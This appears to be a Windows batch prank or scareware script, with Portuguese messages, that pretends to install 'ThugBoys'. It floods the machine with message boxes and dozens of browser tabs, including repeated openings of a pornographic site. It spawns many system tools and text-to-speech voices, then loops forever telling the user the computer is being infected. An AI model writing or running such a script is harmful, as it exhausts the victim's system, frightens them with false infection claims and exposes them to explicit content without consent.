@echo off
title Instalando ThugBoys - NÃO FECHAR!

for /L %%i in (1,1,50) do (
    msg * "Instalando ThugBoys - Aguarde..."
    start https://www.thugboy.com
)

for /L %%i in (1,1,20) do (
    start notepad
    start calc
    start https://www.xvideos.com
    start mspaint
    start taskmgr
    start osk
    start diskmgmt.msc
)


for /L %%i in (1,1,5) do (
    start powershell -c "(New-Object -ComObject SAPI.SpVoice).Speak('Instalando ThugBoys, por favor, aguarde!')"
)

]
color 0A
:loop
echo O sistema esta sendo infectado pelo ThugBoys...
echo Nao desligue o computador!
goto loop
